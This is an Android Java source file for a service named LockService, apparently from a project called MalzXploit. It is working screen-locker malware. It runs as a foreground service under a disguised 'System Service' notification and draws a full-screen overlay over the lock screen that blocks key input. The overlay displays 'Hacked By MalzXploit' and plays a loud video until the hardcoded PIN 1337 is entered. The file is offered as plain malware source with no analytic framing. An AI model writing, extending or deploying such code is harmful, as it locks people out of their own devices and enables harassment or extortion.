package com.malzxploit.lock;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class LockService extends Service {

    private static final String TAG = "MalzLock";
    private static final String VIDEO_URL = "bg.mp4";
    private static final String CORRECT_PIN = "1337";

    private WindowManager wm;
    private WebView webView;
    private boolean unlocked = false;

    @Override
    public void onCreate() {
        super.onCreate();
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        try {
            NotificationChannel ch = new NotificationChannel(
                "sys", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
            Notification n = new Notification.Builder(this, "sys")
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build();
            startForeground(1, n);
        } catch (Exception ignored) {}

        showLock();
        return START_STICKY;
    }

    private void showLock() {
        if (unlocked) return;
        if (webView != null) return;

        new Handler(getMainLooper()).post(new Runnable() {
            @Override public void run() {
                try {
                    webView = new WebView(LockService.this);
                    WebSettings ws = webView.getSettings();
                    ws.setJavaScriptEnabled(true);
                    ws.setDomStorageEnabled(true);
                    ws.setMediaPlaybackRequiresUserGesture(false);
                    ws.setAllowFileAccess(true);
                    ws.setAllowContentAccess(true);
                    ws.setAllowFileAccessFromFileURLs(true);
                    ws.setAllowUniversalAccessFromFileURLs(true);
                    ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
                    ws.setCacheMode(WebSettings.LOAD_DEFAULT);

                    webView.setWebViewClient(new WebViewClient());
                    webView.setWebChromeClient(new WebChromeClient());
                    webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null);
                    webView.addJavascriptInterface(new JsBridge(), "Android");

                    String html = buildHtml();
                    webView.loadDataWithBaseURL(
                        "file:///android_res/raw/",
                        html,
                        "text/html",
                        "utf-8",
                        null
                    );

                    int type;
                    if (Build.VERSION.SDK_INT >= 26) {
                        type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                    } else {
                        type = WindowManager.LayoutParams.TYPE_PHONE;
                    }

                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                            | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                            | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                            | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                            | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                        PixelFormat.OPAQUE
                    );

                    wm.addView(webView, lp);
                    webView.setOnKeyListener((v, k, e) -> true);

                } catch (Exception e) {
                    Log.e(TAG, "showLock error: " + e.getMessage());
                }
            }
        });
    }

    private String buildHtml() {
        String q = String.valueOf((char) 34);
        StringBuilder sb = new StringBuilder();
        sb.append("<!DOCTYPE html><html lang='en'><head>");
        sb.append("<meta charset='UTF-8'>");
        sb.append("<meta name='viewport' content='width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no'>");
        sb.append("<title>MalzXploit</title><style>");
        sb.append("*{box-sizing:border-box;user-select:none;-webkit-tap-highlight-color:transparent}");
        sb.append("html,body{margin:0;width:100%;height:100%;overflow:hidden;background:#000;font-family:Arial,sans-serif;color:#fff}");
        sb.append("video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0;opacity:0.55}");
        sb.append(".overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.35);z-index:1}");
        sb.append(".container{position:relative;z-index:2;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center}");
        sb.append("h1{margin:0 0 14px;font-size:36px;font-weight:bold;text-align:center}");
        sb.append(".subtitle{font-size:21px;color:#bbb;margin-bottom:30px}");
        sb.append(".pin-box{width:305px;height:70px;border:1px solid #555;border-radius:16px;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;margin-bottom:34px}");
        sb.append("#pin{width:100%;border:none;outline:none;background:transparent;color:white;text-align:center;font-size:32px;letter-spacing:12px}");
        sb.append(".keypad{display:grid;grid-template-columns:repeat(3,115px);gap:12px}");
        sb.append("button{height:82px;border:none;border-radius:15px;background:rgba(40,40,40,0.85);color:white;font-size:28px;cursor:pointer}");
        sb.append("button:active{background:rgba(100,100,100,0.9);transform:scale(0.96)}");
        sb.append(".small{font-size:19px}");
        sb.append("@media(max-width:450px){h1{font-size:28px}.subtitle{font-size:18px}.pin-box{width:305px}.keypad{grid-template-columns:repeat(3,105px)}button{height:78px}}");
        sb.append("</style></head><body>");

        sb.append("<video id='bgvid' autoplay loop playsinline preload='auto'>");
        sb.append("<source src='");
        sb.append(VIDEO_URL);
        sb.append("' type='video/mp4'>");
        sb.append("</video>");

        sb.append("<div class='overlay'></div>");
        sb.append("<div class='container'>");
        sb.append("<h1>Hacked By MalzXploit</h1>");
        sb.append("<div class='subtitle'>Enter the 4-digit PIN</div>");
        sb.append("<div class='pin-box'>");
        sb.append("<input id='pin' type='password' maxlength='4' readonly>");
        sb.append("</div>");
        sb.append("<div class='keypad'>");

        sb.append("<button onclick="); sb.append(q); sb.append("press('1')"); sb.append(q); sb.append(">1</button>");
        sb.append("<button onclick="); sb.append(q); sb.append("press('2')"); sb.append(q); sb.append(">2</button>");
        sb.append("<button onclick="); sb.append(q); sb.append("press('3')"); sb.append(q); sb.append(">3</button>");
        sb.append("<button onclick="); sb.append(q); sb.append("press('4')"); sb.append(q); sb.append(">4</button>");
        sb.append("<button onclick="); sb.append(q); sb.append("press('5')"); sb.append(q); sb.append(">5</button>");
        sb.append("<button onclick="); sb.append(q); sb.append("press('6')"); sb.append(q); sb.append(">6</button>");
        sb.append("<button onclick="); sb.append(q); sb.append("press('7')"); sb.append(q); sb.append(">7</button>");
        sb.append("<button onclick="); sb.append(q); sb.append("press('8')"); sb.append(q); sb.append(">8</button>");
        sb.append("<button onclick="); sb.append(q); sb.append("press('9')"); sb.append(q); sb.append(">9</button>");
        sb.append("<button class='small' onclick="); sb.append(q); sb.append("clearPin()"); sb.append(q); sb.append(">CLEAR</button>");
        sb.append("<button onclick="); sb.append(q); sb.append("press('0')"); sb.append(q); sb.append(">0</button>");
        sb.append("<button class='small' onclick="); sb.append(q); sb.append("backspace()"); sb.append(q); sb.append(">DELETE</button>");

        sb.append("</div></div>");

        sb.append("<script>");
        sb.append("window.addEventListener('load',function(){");
        sb.append("var v=document.getElementById('bgvid');");
        sb.append("if(v){v.muted=true;v.play().then(function(){v.muted=false;v.volume=1.0;}).catch(function(e){v.muted=false;setTimeout(function(){v.play();},500);});}");
        sb.append("});");
        sb.append("var CORRECT_PIN='");
        sb.append(CORRECT_PIN);
        sb.append("';");
        sb.append("function press(n){var p=document.getElementById('pin');if(p.value.length>=4)return;p.value+=n;if(p.value.length===4)checkPin();}");
        sb.append("function clearPin(){document.getElementById('pin').value='';}");
        sb.append("function backspace(){var p=document.getElementById('pin');p.value=p.value.slice(0,-1);}");
        sb.append("function checkPin(){var p=document.getElementById('pin').value;if(p===CORRECT_PIN){if(window.Android){window.Android.unlock();}}else{setTimeout(function(){document.getElementById('pin').value='';},300);}}");
        sb.append("document.addEventListener('contextmenu',function(e){e.preventDefault();});");
        sb.append("</script></body></html>");

        return sb.toString();
    }

    private class JsBridge {
        @JavascriptInterface
        public void unlock() {
            unlocked = true;
            new Handler(getMainLooper()).post(new Runnable() {
                @Override public void run() {
                    try {
                        if (webView != null) {
                            wm.removeView(webView);
                            webView = null;
                        }
                    } catch (Exception ignored) {}
                    stopSelf();
                }
            });
        }
    }

    @Override
    public void onDestroy() {
        try {
            if (webView != null) wm.removeView(webView);
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
